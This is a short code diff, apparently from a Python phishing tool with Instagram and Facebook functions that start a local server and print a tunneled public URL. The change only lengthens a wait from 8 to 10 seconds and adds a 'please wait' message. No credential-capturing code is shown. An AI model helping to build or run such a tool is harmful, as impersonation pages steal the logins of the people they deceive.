@@ -146,7 +146,7 @@ def instagram():
 
     loaclhost()
 
-    sleep(8)
+    sleep(10)
 
 #====================================================================================================
 
@@ -263,8 +263,9 @@ def facebook():
     sleep(1)
 
     loaclhost()
-
-    sleep(8)
+    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
+    sleep(10)
+    print("                       " , end="\r")
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
